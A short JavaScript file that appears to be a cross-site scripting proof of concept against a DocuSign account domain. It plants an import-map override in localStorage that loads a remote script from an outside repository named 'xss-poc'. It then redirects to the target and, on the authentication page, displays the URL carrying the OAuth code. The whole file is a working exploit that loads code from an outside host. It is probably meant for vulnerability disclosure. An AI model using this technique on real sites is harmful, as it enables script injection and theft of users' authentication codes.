const searchParams = new URLSearchParams(location.search);

if(searchParams.has('code') && location.path ==='/authenticate') {
  alert(location.href);
  console.log(location.href);
} else {
  localStorage.setItem(
    'import-map-overrides-external-maps',
    JSON.stringify([
      {
        imports: {
          "optimizelySdk":"https://cdn.jsdelivr.net/gh/CaTzil/xss-poc@main/docu.js"
        },
      },
    ])
  );
  location.href = 'https://account-d.docusign.com/'
}
